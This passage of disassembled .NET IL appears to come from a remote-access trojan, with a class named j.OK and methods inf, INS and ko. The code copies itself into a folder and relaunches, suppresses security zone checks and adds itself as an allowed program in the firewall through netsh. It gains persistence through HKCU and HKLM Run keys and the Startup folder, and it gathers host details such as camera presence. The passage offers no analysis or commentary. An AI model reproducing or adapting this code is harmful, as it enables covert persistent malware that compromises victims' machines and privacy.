                                                                  string,
                                                                  string)
      IL_0350:  stloc.1
      IL_0351:  nop
      IL_0352:  leave.s    IL_0382

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0354:  dup
      IL_0355:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_035a:  stloc.s    V_16
      IL_035c:  nop
      IL_035d:  ldloc.s    V_16
      IL_035f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0364:  nop
      IL_0365:  ldloc.s    V_16
      IL_0367:  stloc.s    V_17
      IL_0369:  ldloc.1
      IL_036a:  ldsfld     string j.OK::Y
      IL_036f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0374:  stloc.1
      IL_0375:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_037a:  nop
      IL_037b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0380:  leave.s    IL_0382

    }  // end handler
    IL_0382:  nop
    IL_0383:  call       bool j.OK::Cam()
    IL_0388:  stloc.s    V_28
    IL_038a:  ldloc.s    V_28
    IL_038c:  brfalse.s  IL_03a1

    IL_038e:  ldloc.1
    IL_038f:  ldstr      "Yes"
    IL_0394:  ldsfld     string j.OK::Y
    IL_0399:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_039e:  stloc.1
    IL_039f:  br.s       IL_03b3

    IL_03a1:  nop
    IL_03a2:  ldloc.1
    IL_03a3:  ldstr      "No"
    IL_03a8:  ldsfld     string j.OK::Y
    IL_03ad:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_03b2:  stloc.1
    IL_03b3:  nop
    IL_03b4:  ldc.i4.7
    IL_03b5:  newarr     [mscorlib]System.String
    IL_03ba:  stloc.s    V_25
    IL_03bc:  ldloc.s    V_25
    IL_03be:  ldc.i4.0
    IL_03bf:  ldloc.1
    IL_03c0:  stelem.ref
    IL_03c1:  nop
    IL_03c2:  ldloc.s    V_25
    IL_03c4:  ldc.i4.1
    IL_03c5:  ldsfld     string j.OK::VR
    IL_03ca:  stelem.ref
    IL_03cb:  nop
    IL_03cc:  ldloc.s    V_25
    IL_03ce:  ldc.i4.2
    IL_03cf:  ldsfld     string j.OK::Y
    IL_03d4:  stelem.ref
    IL_03d5:  nop
    IL_03d6:  ldloc.s    V_25
    IL_03d8:  ldc.i4.3
    IL_03d9:  ldstr      ".."
    IL_03de:  stelem.ref
    IL_03df:  nop
    IL_03e0:  ldloc.s    V_25
    IL_03e2:  ldc.i4.4
    IL_03e3:  ldsfld     string j.OK::Y
    IL_03e8:  stelem.ref
    IL_03e9:  nop
    IL_03ea:  ldloc.s    V_25
    IL_03ec:  ldc.i4.5
    IL_03ed:  call       string j.OK::ACT()
    IL_03f2:  stelem.ref
    IL_03f3:  nop
    IL_03f4:  ldloc.s    V_25
    IL_03f6:  ldc.i4.6
    IL_03f7:  ldsfld     string j.OK::Y
    IL_03fc:  stelem.ref
    IL_03fd:  nop
    IL_03fe:  ldloc.s    V_25
    IL_0400:  call       string [mscorlib]System.String::Concat(string[])
    IL_0405:  stloc.1
    IL_0406:  ldstr      ""
    IL_040b:  stloc.2
    IL_040c:  nop
    .try
    {
      IL_040d:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0412:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0417:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_041c:  ldstr      "Software\\"
      IL_0421:  ldsfld     string j.OK::RG
      IL_0426:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_042b:  ldc.i4.0
      IL_042c:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::CreateSubKey(string,
                                                                                                                                    valuetype [mscorlib]Microsoft.Win32.RegistryKeyPermissionCheck)
      IL_0431:  callvirt   instance string[] [mscorlib]Microsoft.Win32.RegistryKey::GetValueNames()
      IL_0436:  stloc.s    V_27
      IL_0438:  ldc.i4.0
      IL_0439:  stloc.s    V_26
      IL_043b:  br.s       IL_046b

      IL_043d:  ldloc.s    V_27
      IL_043f:  ldloc.s    V_26
      IL_0441:  ldelem.ref
      IL_0442:  stloc.s    V_18
      IL_0444:  ldloc.s    V_18
      IL_0446:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_044b:  ldc.i4.s   32
      IL_044d:  ceq
      IL_044f:  stloc.s    V_28
      IL_0451:  ldloc.s    V_28
      IL_0453:  brfalse.s  IL_0463

      IL_0455:  ldloc.2
      IL_0456:  ldloc.s    V_18
      IL_0458:  ldstr      ","
      IL_045d:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0462:  stloc.2
      IL_0463:  nop
      IL_0464:  ldloc.s    V_26
      IL_0466:  ldc.i4.1
      IL_0467:  add.ovf
      IL_0468:  stloc.s    V_26
      IL_046a:  nop
      IL_046b:  ldloc.s    V_26
      IL_046d:  ldloc.s    V_27
      IL_046f:  ldlen
      IL_0470:  conv.ovf.i4
      IL_0471:  clt
      IL_0473:  stloc.s    V_28
      IL_0475:  ldloc.s    V_28
      IL_0477:  brtrue.s   IL_043d

      IL_0479:  leave.s    IL_049d

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_047b:  dup
      IL_047c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0481:  stloc.s    V_19
      IL_0483:  nop
      IL_0484:  ldloc.s    V_19
      IL_0486:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_048b:  nop
      IL_048c:  ldloc.s    V_19
      IL_048e:  stloc.s    V_20
      IL_0490:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0495:  nop
      IL_0496:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_049b:  leave.s    IL_049d

    }  // end handler
    IL_049d:  nop
    IL_049e:  ldloc.1
    IL_049f:  ldloc.2
    IL_04a0:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_04a5:  stloc.0
    IL_04a6:  br.s       IL_04a8

    IL_04a8:  ldloc.0
    IL_04a9:  ret
  } // end of method OK::inf

  .method public static void  INS() cil managed noinlining nooptimization
  {
    // Code size       852 (0x354)
    .maxstack  5
    .locals init (uint8[] V_0,
             class [mscorlib]System.IO.FileStream V_1,
             class [mscorlib]System.Exception V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.Exception V_7,
             class [mscorlib]System.Exception V_8,
             class [mscorlib]System.Exception V_9,
             class [mscorlib]System.Exception V_10,
             class [mscorlib]System.Exception V_11,
             class [mscorlib]System.Exception V_12,
             class [mscorlib]System.Exception V_13,
             string[] V_14,
             bool V_15,
             bool V_16)
    IL_0000:  nop
    IL_0001:  ldc.i4     0x3e8
    IL_0006:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_000b:  nop
    IL_000c:  ldsfld     bool j.OK::Idr
    IL_0011:  brfalse.s  IL_0047

    IL_0013:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_0018:  ldsfld     string j.OK::DR
    IL_001d:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
    IL_0022:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0027:  ldstr      "\\"
    IL_002c:  ldsfld     string j.OK::EXE
    IL_0031:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0036:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_003b:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
    IL_0040:  call       bool j.OK::CompDir(class [mscorlib]System.IO.FileInfo,
                                            class [mscorlib]System.IO.FileInfo)
    IL_0045:  brfalse.s  IL_004a

    IL_0047:  ldc.i4.0
    IL_0048:  br.s       IL_004b

    IL_004a:  ldc.i4.1
    IL_004b:  stloc.s    V_15
    IL_004d:  ldloc.s    V_15
    IL_004f:  brfalse    IL_0143

    IL_0054:  nop
    .try
    {
      IL_0055:  ldsfld     string j.OK::DR
      IL_005a:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_005f:  ldstr      "\\"
      IL_0064:  ldsfld     string j.OK::EXE
      IL_0069:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_006e:  call       bool [mscorlib]System.IO.File::Exists(string)
      IL_0073:  stloc.s    V_16
      IL_0075:  ldloc.s    V_16
      IL_0077:  brfalse.s  IL_0098

      IL_0079:  ldsfld     string j.OK::DR
      IL_007e:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_0083:  ldstr      "\\"
      IL_0088:  ldsfld     string j.OK::EXE
      IL_008d:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0092:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_0097:  nop
      IL_0098:  nop
      IL_0099:  ldsfld     string j.OK::DR
      IL_009e:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_00a3:  ldstr      "\\"
      IL_00a8:  ldsfld     string j.OK::EXE
      IL_00ad:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00b2:  ldc.i4.1
      IL_00b3:  newobj     instance void [mscorlib]System.IO.FileStream::.ctor(string,
                                                                               valuetype [mscorlib]System.IO.FileMode)
      IL_00b8:  stloc.1
      IL_00b9:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_00be:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_00c3:  call       uint8[] [mscorlib]System.IO.File::ReadAllBytes(string)
      IL_00c8:  stloc.0
      IL_00c9:  ldloc.1
      IL_00ca:  ldloc.0
      IL_00cb:  ldc.i4.0
      IL_00cc:  ldloc.0
      IL_00cd:  ldlen
      IL_00ce:  conv.ovf.i4
      IL_00cf:  callvirt   instance void [mscorlib]System.IO.FileStream::Write(uint8[],
                                                                               int32,
                                                                               int32)
      IL_00d4:  nop
      IL_00d5:  ldloc.1
      IL_00d6:  callvirt   instance void [mscorlib]System.IO.FileStream::Flush()
      IL_00db:  nop
      IL_00dc:  ldloc.1
      IL_00dd:  callvirt   instance void [mscorlib]System.IO.Stream::Close()
      IL_00e2:  nop
      IL_00e3:  ldsfld     string j.OK::DR
      IL_00e8:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_00ed:  ldstr      "\\"
      IL_00f2:  ldsfld     string j.OK::EXE
      IL_00f7:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00fc:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
      IL_0101:  stsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0106:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_010b:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_0110:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_0115:  pop
      IL_0116:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_011b:  nop
      IL_011c:  leave.s    IL_0142

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_011e:  dup
      IL_011f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0124:  stloc.3
      IL_0125:  nop
      IL_0126:  ldloc.3
      IL_0127:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_012c:  nop
      IL_012d:  ldloc.3
      IL_012e:  stloc.2
      IL_012f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_0134:  nop
      IL_0135:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_013a:  nop
      IL_013b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0140:  leave.s    IL_0142

    }  // end handler
    IL_0142:  nop
    IL_0143:  nop
    IL_0144:  nop
    .try
    {
      IL_0145:  ldstr      "SEE_MASK_NOZONECHECKS"
      IL_014a:  ldstr      "1"
      IL_014f:  ldc.i4.1
      IL_0150:  call       void [mscorlib]System.Environment::SetEnvironmentVariable(string,
                                                                                     string,
                                                                                     valuetype [mscorlib]System.EnvironmentVariableTarget)
      IL_0155:  nop
      IL_0156:  leave.s    IL_017a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0158:  dup
      IL_0159:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_015e:  stloc.s    V_5
      IL_0160:  nop
      IL_0161:  ldloc.s    V_5
      IL_0163:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0168:  nop
      IL_0169:  ldloc.s    V_5
      IL_016b:  stloc.s    V_4
      IL_016d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0172:  nop
      IL_0173:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0178:  leave.s    IL_017a

    }  // end handler
    IL_017a:  nop
    IL_017b:  nop
    .try
    {
      IL_017c:  ldc.i4.5
      IL_017d:  newarr     [mscorlib]System.String
      IL_0182:  stloc.s    V_14
      IL_0184:  ldloc.s    V_14
      IL_0186:  ldc.i4.0
      IL_0187:  ldstr      "netsh firewall add allowedprogram \""
      IL_018c:  stelem.ref
      IL_018d:  nop
      IL_018e:  ldloc.s    V_14
      IL_0190:  ldc.i4.1
      IL_0191:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0196:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_019b:  stelem.ref
      IL_019c:  nop
      IL_019d:  ldloc.s    V_14
      IL_019f:  ldc.i4.2
      IL_01a0:  ldstr      "\" \""
      IL_01a5:  stelem.ref
      IL_01a6:  nop
      IL_01a7:  ldloc.s    V_14
      IL_01a9:  ldc.i4.3
      IL_01aa:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_01af:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
      IL_01b4:  stelem.ref
      IL_01b5:  nop
      IL_01b6:  ldloc.s    V_14
      IL_01b8:  ldc.i4.4
      IL_01b9:  ldstr      "\" ENABLE"
      IL_01be:  stelem.ref
      IL_01bf:  nop
      IL_01c0:  ldloc.s    V_14
      IL_01c2:  call       string [mscorlib]System.String::Concat(string[])
      IL_01c7:  ldc.i4.0
      IL_01c8:  ldc.i4.1
      IL_01c9:  ldc.i4     0x1388
      IL_01ce:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_01d3:  pop
      IL_01d4:  leave.s    IL_01f8

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01d6:  dup
      IL_01d7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01dc:  stloc.s    V_7
      IL_01de:  nop
      IL_01df:  ldloc.s    V_7
      IL_01e1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01e6:  nop
      IL_01e7:  ldloc.s    V_7
      IL_01e9:  stloc.s    V_6
      IL_01eb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01f0:  nop
      IL_01f1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01f6:  leave.s    IL_01f8

    }  // end handler
    IL_01f8:  nop
    IL_01f9:  ldsfld     bool j.OK::Isu
    IL_01fe:  stloc.s    V_16
    IL_0200:  ldloc.s    V_16
    IL_0202:  brfalse    IL_02cf

    IL_0207:  nop
    .try
    {
      IL_0208:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_020d:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0212:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0217:  ldsfld     string j.OK::sf
      IL_021c:  ldc.i4.1
      IL_021d:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0222:  ldsfld     string j.OK::RG
      IL_0227:  ldstr      "\""
      IL_022c:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0231:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_0236:  ldstr      "\" .."
      IL_023b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0240:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_0245:  nop
      IL_0246:  leave.s    IL_026a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0248:  dup
      IL_0249:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_024e:  stloc.s    V_9
      IL_0250:  nop
      IL_0251:  ldloc.s    V_9
      IL_0253:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0258:  nop
      IL_0259:  ldloc.s    V_9
      IL_025b:  stloc.s    V_8
      IL_025d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0262:  nop
      IL_0263:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0268:  leave.s    IL_026a

    }  // end handler
    IL_026a:  nop
    IL_026b:  nop
    .try
    {
      IL_026c:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0271:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0276:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
      IL_027b:  ldsfld     string j.OK::sf
      IL_0280:  ldc.i4.1
      IL_0281:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0286:  ldsfld     string j.OK::RG
      IL_028b:  ldstr      "\""
      IL_0290:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0295:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_029a:  ldstr      "\" .."
      IL_029f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_02a4:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_02a9:  nop
      IL_02aa:  leave.s    IL_02ce

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_02ac:  dup
      IL_02ad:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02b2:  stloc.s    V_10
      IL_02b4:  nop
      IL_02b5:  ldloc.s    V_10
      IL_02b7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02bc:  nop
      IL_02bd:  ldloc.s    V_10
      IL_02bf:  stloc.s    V_11
      IL_02c1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_02c6:  nop
      IL_02c7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_02cc:  leave.s    IL_02ce

    }  // end handler
    IL_02ce:  nop
    IL_02cf:  nop
    IL_02d0:  ldsfld     bool j.OK::IsF
    IL_02d5:  stloc.s    V_16
    IL_02d7:  ldloc.s    V_16
    IL_02d9:  brfalse.s  IL_0351

    IL_02db:  nop
    .try
    {
      IL_02dc:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_02e1:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_02e6:  ldc.i4.7
      IL_02e7:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_02ec:  ldstr      "\\"
      IL_02f1:  ldsfld     string j.OK::RG
      IL_02f6:  ldstr      ".exe"
      IL_02fb:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_0300:  ldc.i4.1
      IL_0301:  call       void [mscorlib]System.IO.File::Copy(string,
                                                               string,
                                                               bool)
      IL_0306:  nop
      IL_0307:  ldc.i4.7
      IL_0308:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_030d:  ldstr      "\\"
      IL_0312:  ldsfld     string j.OK::RG
      IL_0317:  ldstr      ".exe"
      IL_031c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_0321:  ldc.i4.3
      IL_0322:  newobj     instance void [mscorlib]System.IO.FileStream::.ctor(string,
                                                                               valuetype [mscorlib]System.IO.FileMode)
      IL_0327:  stsfld     class [mscorlib]System.IO.FileStream j.OK::FS
      IL_032c:  leave.s    IL_0350

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_032e:  dup
      IL_032f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0334:  stloc.s    V_12
      IL_0336:  nop
      IL_0337:  ldloc.s    V_12
      IL_0339:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_033e:  nop
      IL_033f:  ldloc.s    V_12
      IL_0341:  stloc.s    V_13
      IL_0343:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0348:  nop
      IL_0349:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_034e:  leave.s    IL_0350

    }  // end handler
    IL_0350:  nop
    IL_0351:  nop
    IL_0352:  nop
    IL_0353:  ret
  } // end of method OK::INS

  .method public static void  ko() cil managed noinlining nooptimization
  {
    // Code size       1044 (0x414)
    .maxstack  8
    .locals init (bool V_0,
             int32 V_1,
             string V_2,
             object V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             object V_6,
             class [mscorlib]System.Exception V_7,
             class [mscorlib]System.Exception V_8,
             class [mscorlib]System.Exception V_9,
             class [mscorlib]System.Exception V_10,
             class [mscorlib]System.Exception V_11,
             class [mscorlib]System.Exception V_12,
             string V_13,
             class [mscorlib]System.Exception V_14,
             class [mscorlib]System.Exception V_15,
             class [mscorlib]System.Exception V_16,
             class [mscorlib]System.Exception V_17,
             class [mscorlib]System.Exception V_18,
             class [mscorlib]System.Exception V_19,
             native int V_20,
             bool V_21,
             bool V_22)
    IL_0000:  nop
    IL_0001:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Command()
    IL_0006:  ldnull
    IL_0007:  ceq
    IL_0009:  ldc.i4.0
    IL_000a:  ceq
    IL_000c:  stloc.s    V_21
    IL_000e:  ldloc.s    V_21
    IL_0010:  brfalse.s  IL_0062

    IL_0012:  nop
    .try
    {
      IL_0013:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0018:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_001d:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0022:  ldstr      "di"
      IL_0027:  ldstr      "!"
      IL_002c:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_0031:  nop
      IL_0032:  leave.s    IL_0056

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0034:  dup
      IL_0035:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_003a:  stloc.s    V_5
      IL_003c:  nop
      IL_003d:  ldloc.s    V_5
      IL_003f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0044:  nop
      IL_0045:  ldloc.s    V_5
      IL_0047:  stloc.s    V_4
      IL_0049:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_004e:  nop
      IL_004f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0054:  leave.s    IL_0056

    }  // end handler
    IL_0056:  nop
    IL_0057:  ldc.i4     0x1388
    IL_005c:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_0061:  nop
    IL_0062:  nop
    IL_0063:  ldc.i4.0
    IL_0064:  stloc.0
    IL_0065:  ldc.i4.1
    IL_0066:  ldsfld     string j.OK::RG
    IL_006b:  ldloca.s   V_0
    IL_006d:  newobj     instance void [mscorlib]System.Threading.Mutex::.ctor(bool,
                                                                               string,
                                                                               bool&)
    IL_0072:  stsfld     object j.OK::MT
    IL_0077:  ldloc.0
    IL_0078:  ldc.i4.0
    IL_0079:  ceq
    IL_007b:  stloc.s    V_21
    IL_007d:  ldloc.s    V_21
    IL_007f:  brfalse.s  IL_0087

    IL_0081:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0086:  nop
    IL_0087:  nop
    IL_0088:  call       void j.OK::INS()
    IL_008d:  nop
    IL_008e:  ldsfld     bool j.OK::Idr
    IL_0093:  ldc.i4.0
    IL_0094:  ceq
    IL_0096:  stloc.s    V_21
    IL_0098:  ldloc.s    V_21
    IL_009a:  brfalse.s  IL_00bf

    IL_009c:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_00a1:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
    IL_00a6:  stsfld     string j.OK::EXE
    IL_00ab:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_00b0:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.FileInfo::get_Directory()
    IL_00b5:  callvirt   instance string [mscorlib]System.IO.DirectoryInfo::get_Name()
    IL_00ba:  stsfld     string j.OK::DR
    IL_00bf:  nop
    IL_00c0:  ldnull
    IL_00c1:  ldftn      void j.OK::RC()
    IL_00c7:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                     native int)
    IL_00cc:  ldc.i4.1
    IL_00cd:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart,
                                                                                int32)
    IL_00d2:  stloc.3
    IL_00d3:  ldloc.3
    IL_00d4:  ldnull
    IL_00d5:  ldstr      "Start"
    IL_00da:  ldc.i4.0
    IL_00db:  newarr     [mscorlib]System.Object
    IL_00e0:  ldnull
    IL_00e1:  ldnull
    IL_00e2:  ldnull
    IL_00e3:  ldc.i4.1
    IL_00e4:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                       class [mscorlib]System.Type,
                                                                                                                       string,
                                                                                                                       object[],
                                                                                                                       string[],
